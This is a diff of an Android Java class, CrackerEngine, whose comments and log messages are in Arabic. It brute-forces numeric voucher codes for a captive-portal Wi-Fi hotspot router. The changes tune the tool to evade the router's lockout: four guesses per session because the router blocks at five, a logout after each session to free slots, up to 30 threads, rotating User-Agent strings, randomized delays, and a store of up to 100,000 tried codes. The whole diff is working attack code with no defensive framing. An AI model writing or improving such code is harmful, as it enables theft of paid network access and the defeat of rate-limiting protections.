@@ -14,15 +14,16 @@ public class CrackerEngine {
         void onFound(String voucher, String status);
     }
 
+    // ✅ 4 محاولات فقط لكل جلسة (الراوتر يحظر عند 5)
     private static final int ATTEMPTS_PER_SESSION = 4;
     
     private final Listener listener;
     private final SharedPreferences prefs;
     private final String network;
-    private final String loginUrl, statusUrl, baseUrl;
+    private final String loginUrl, statusUrl, logoutUrl, baseUrl;
     private final String prefix, suffix;
     private final int digits, maxAttempts, threads;
-    private final int pauseMs, retryDelay;
+    private final int pauseMs;
 
     private final AtomicBoolean stopped = new AtomicBoolean(false);
     private final AtomicBoolean found = new AtomicBoolean(false);
@@ -33,27 +34,29 @@ public class CrackerEngine {
 
     public CrackerEngine(Listener l, SharedPreferences p, String network,
                          String loginUrl, String prefix, String suffix, int digits,
-                         int maxAttempts, int threads, int pauseMs, int retryDelay) {
+                         int maxAttempts, int threads, int pauseMs) {
         this.listener = l; this.prefs = p; this.network = network;
         this.loginUrl = loginUrl;
         try {
-            this.baseUrl = new URL(loginUrl).getProtocol() + "://" + new URL(loginUrl).getHost();
+            String base = new URL(loginUrl).getProtocol() + "://" + new URL(loginUrl).getHost();
+            this.baseUrl = base;
         } catch (Exception e) { throw new RuntimeException("bad url"); }
         this.statusUrl = baseUrl + "/status?var=callBack";
+        this.logoutUrl = baseUrl + "/logout?erase-cookie=yes&var=callBack";
         this.prefix = prefix != null ? prefix : "";
         this.suffix = suffix != null ? suffix : "";
-        this.digits = digits; this.maxAttempts = maxAttempts;
-        this.threads = Math.max(1, Math.min(threads, 20)); // رفع الحد الأقصى للخيوط
-        this.pauseMs = Math.max(0, pauseMs); // السماح بالتأخير الصفري
-        this.retryDelay = retryDelay;
+        this.digits = digits;
+        this.maxAttempts = maxAttempts;
+        this.threads = Math.max(1, Math.min(threads, 30)); // حتى 30 خيط!
+        this.pauseMs = Math.max(0, pauseMs);
         this.tried = Collections.synchronizedSet(loadTried());
     }
 
     private Set<String> loadTried() {
         Set<String> s = new HashSet<>(prefs.getStringSet("tried_" + network, new HashSet<>()));
-        if (s.size() > 50000) {
+        if (s.size() > 100000) {
             List<String> l = new ArrayList<>(s);
-            s = new HashSet<>(l.subList(l.size() - 50000, l.size()));
+            s = new HashSet<>(l.subList(l.size() - 100000, l.size()));
         }
         return s;
     }
@@ -71,30 +74,27 @@ public class CrackerEngine {
 
     private void runEngine() {
         try {
-            log("▶ بدء التخمين (السرعة القصوى - خيوط متعددة)");
-            log("  الخيوط: " + threads + " | التأخير: " + pauseMs + "ms");
+            log("▶ بدء المحرك (جلسات متجددة + تحرير فوري)");
+            log("  الخيوط: " + threads + " | كل جلسة: " + ATTEMPTS_PER_SESSION + " محاولات");
+            log("  الميزة: تحرير الجلسة فوراً بعد الاستخدام (لا تراكم)");
 
-            log("→ تسجيل خروج...");
-            try {
-                HttpURLConnection c = (HttpURLConnection) new URL(baseUrl + "/logout?erase-cookie=yes&var=callBack").openConnection();
-                c.setConnectTimeout(3000); c.setReadTimeout(3000);
-                c.getResponseCode(); c.disconnect();
-            } catch (Exception e) {}
-            sleep(1000);
+            log("→ تسجيل خروج أولي...");
+            logoutSession(null);
+            sleep(800);
 
-            log("  أرقام مجربة سابقاً: " + tried.size());
+            log("  أرقام مجربة: " + tried.size());
 
             synchronized (workers) {
                 workers.clear();
                 for (int i = 0; i < threads; i++) {
                     final int wid = i;
-                    Thread t = new Thread(() -> workerLoop(wid), "Worker-" + wid);
+                    Thread t = new Thread(() -> workerLoop(wid), "W" + wid);
                     workers.add(t);
                     t.start();
-                    sleep(50); // تشغيل سريع للخيوط
+                    sleep(150);
                 }
             }
-            log("✓ يعمل الآن " + threads + " خيوط...");
+            log("✓ يعمل الآن " + threads + " خيط بجلسات متجددة...");
 
             for (Thread t : new ArrayList<>(workers)) {
                 try { t.join(); } catch (Exception e) {}
@@ -109,18 +109,22 @@ public class CrackerEngine {
 
     private void workerLoop(int id) {
         while (!stopped.get() && !found.get() && done.get() < maxAttempts) {
+            // ===== 1. جلسة جديدة نظيفة =====
             Map<String, String> cookies = new HashMap<>();
             Map<String, String> template = openSession(cookies, id);
+            
             if (template == null) {
-                sleep(500);
+                sleep(500 + rng.nextInt(500));
                 continue;
             }
 
+            // ===== 2. إرسال 4 محاولات فقط =====
+            boolean sessionBurned = false;
             for (int i = 0; i < ATTEMPTS_PER_SESSION && !stopped.get() && !found.get(); i++) {
-                if (done.get() >= maxAttempts) return;
+                if (done.get() >= maxAttempts) break;
                 
                 String v = generate();
-                if (v == null) return;
+                if (v == null) { sessionBurned = true; break; }
                 
                 int cur = done.incrementAndGet();
                 listener.onProgress(cur, maxAttempts, v);
@@ -129,27 +133,53 @@ public class CrackerEngine {
                 Result r = tryLogin(cookies, template, v);
                 if (stopped.get() || found.get()) return;
                 
-                if (r.busy) {
-                    log("[W" + id + "]   ⏳ مشغول — تبديل الجلسة");
-                    sleep(retryDelay);
-                    break;
-                }
-                
                 if (r.success) {
                     found.set(true);
                     log("[W" + id + "] ✅✅✅ " + v);
+                    // إرسال logout قبل الإعلان (لتحرير الكل)
+                    logoutSession(cookies);
                     listener.onFound(v, r.statusJson);
                     return;
                 }
                 
-                if (r.error != null && !r.error.equals("stopped")) {
-                    log("[W" + id + "]   ❌ " + r.error);
+                if (r.busy) {
+                    log("[W" + id + "]   🛑 حظر — إغلاق الجلسة");
+                    sessionBurned = true;
+                    break;
                 }
                 
-                if (pauseMs > 0) sleep(pauseMs);
+                if (r.error != null && !r.error.startsWith("network:")) {
+                    log("[W" + id + "]   ❌ " + r.error);
+                    saveTried(v);
+                }
+                
+                if (pauseMs > 0) sleep(pauseMs + rng.nextInt(200));
             }
             
-            if (pauseMs > 0) sleep(100);
+            // ===== 3. تحرير الجلسة (الأهم!) =====
+            logoutSession(cookies);
+            cookies.clear();
+            
+            // ===== 4. استراحة قصيرة قبل الجلسة التالية =====
+            if (!sessionBurned) sleep(100 + rng.nextInt(200));
+            else sleep(2000); // استراحة أطول إذا كانت الجلسة محظورة
+        }
+    }
+
+    // 🔑 دالة سحرية: إغلاق الجلسة لتحرير مكانها في الراوتر
+    private void logoutSession(Map<String, String> cookies) {
+        try {
+            HttpURLConnection c = (HttpURLConnection) new URL(logoutUrl).openConnection();
+            c.setConnectTimeout(3000);
+            c.setReadTimeout(3000);
+            c.setRequestProperty("User-Agent", ua());
+            if (cookies != null && !cookies.isEmpty()) {
+                c.setRequestProperty("Cookie", cookiesStr(cookies));
+            }
+            c.getResponseCode();
+            c.disconnect();
+        } catch (Exception e) {
+            // صامت — لا نريد إيقاف المحرك بسبب فشل logout
         }
     }
 
@@ -157,8 +187,9 @@ public class CrackerEngine {
         if (stopped.get()) return null;
         String ua = ua();
         try {
+            // 1. صفحة البداية (كوكيز جديدة)
             HttpURLConnection c1 = (HttpURLConnection) new URL(baseUrl + "/").openConnection();
-            c1.setConnectTimeout(3000); c1.setReadTimeout(3000);
+            c1.setConnectTimeout(4000); c1.setReadTimeout(4000);
             c1.setRequestProperty("User-Agent", ua);
             c1.setRequestProperty("Connection", "keep-alive");
             c1.getResponseCode();
@@ -166,8 +197,9 @@ public class CrackerEngine {
             c1.disconnect();
             if (stopped.get()) return null;
 
+            // 2. صفحة الفورم (بكوكيز الجلسة الجديدة)
             HttpURLConnection c2 = (HttpURLConnection) new URL(loginUrl).openConnection();
-            c2.setConnectTimeout(3000); c2.setReadTimeout(3000);
+            c2.setConnectTimeout(4000); c2.setReadTimeout(4000);
             c2.setRequestProperty("User-Agent", ua);
             c2.setRequestProperty("Connection", "keep-alive");
             String ck = cookiesStr(cookies);
@@ -175,8 +207,7 @@ public class CrackerEngine {
             
             int code2 = c2.getResponseCode();
             InputStream is2 = (code2 >= 400) ? c2.getErrorStream() : c2.getInputStream();
-            String html = "";
-            if (is2 != null) html = read(is2);
+            String html = is2 != null ? read(is2) : "";
             extractCookies(c2, cookies);
             c2.disconnect();
 
@@ -196,7 +227,6 @@ public class CrackerEngine {
         while (m.find()) fields.put(m.group(1), m.group(2) == null ? "" : m.group(2));
         
         if (fields.isEmpty()) {
-            log("[W" + wid + "] ℹ لا يوجد <form> — استخدام الحقول الافتراضية");
             fields.put("username", "");
             fields.put("password", "");
             fields.put("dst", baseUrl + "/");
@@ -221,8 +251,8 @@ public class CrackerEngine {
             c.setRequestMethod("POST");
             c.setDoOutput(true);
             c.setInstanceFollowRedirects(false);
-            // تقليل وقت الانتظار إلى 3 ثوانٍ لكي نتجاوز الاتصالات الميتة بسرعة
-            c.setConnectTimeout(3000); c.setReadTimeout(3000);
+            c.setConnectTimeout(4000);
+            c.setReadTimeout(4000);
             c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
             c.setRequestProperty("User-Agent", ua);
             c.setRequestProperty("Connection", "keep-alive");
@@ -262,9 +292,9 @@ public class CrackerEngine {
             }
 
             // فحص الحالة
-            sleep(50);
+            sleep(80);
             HttpURLConnection c4 = (HttpURLConnection) new URL(statusUrl).openConnection();
-            c4.setConnectTimeout(3000); c4.setReadTimeout(3000);
+            c4.setConnectTimeout(4000); c4.setReadTimeout(4000);
             c4.setRequestProperty("User-Agent", ua);
             String ck2 = cookiesStr(cookies);
             if (!ck2.isEmpty()) c4.setRequestProperty("Cookie", ck2);
@@ -279,7 +309,7 @@ public class CrackerEngine {
                     return Result.ok(statusBody);
             } catch (Exception e) {}
             
-            return Result.bad(null);
+            return Result.bad("خاطئ");
         } catch (Exception e) {
             return Result.bad("network: " + e.getMessage());
         }
@@ -294,23 +324,25 @@ public class CrackerEngine {
 
     private String generate() {
         int max = (int) Math.pow(10, digits) - 1;
-        for (int k = 0; k < 500; k++) {
+        for (int k = 0; k < 2000; k++) {
             int num = rng.nextInt(max + 1);
             String v = prefix + String.format(java.util.Locale.US, "%0" + digits + "d", num) + suffix;
-            if (tried.add(v)) {
-                synchronized (prefs) {
-                    Set<String> s = new HashSet<>(prefs.getStringSet("tried_" + network, new HashSet<>()));
-                    s.add(v);
-                    if (s.size() > 50000) {
-                        List<String> l = new ArrayList<>(s);
-                        s = new HashSet<>(l.subList(l.size() - 50000, l.size()));
-                    }
-                    prefs.edit().putStringSet("tried_" + network, s).apply();
-                }
-                return v;
-            }
+            if (!tried.contains(v)) return v;
         }
         return null;
+    }
+
+    private void saveTried(String v) {
+        tried.add(v);
+        synchronized (prefs) {
+            Set<String> s = new HashSet<>(prefs.getStringSet("tried_" + network, new HashSet<>()));
+            s.add(v);
+            if (s.size() > 100000) {
+                List<String> l = new ArrayList<>(s);
+                s = new HashSet<>(l.subList(l.size() - 100000, l.size()));
+            }
+            prefs.edit().putStringSet("tried_" + network, s).apply();
+        }
     }
 
     private void extractCookies(HttpURLConnection c, Map<String, String> store) {
@@ -340,8 +372,9 @@ public class CrackerEngine {
 
     private String ua() {
         String[] a = {
-            "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/118.0 Mobile Safari/537.36",
-            "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 Chrome/115.0 Mobile Safari/537.36"
+            "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 Chrome/118.0 Mobile",
+            "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 Chrome/115.0 Mobile",
+            "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 Chrome/110.0 Mobile"
         };
         return a[rng.nextInt(a.length)];
     }
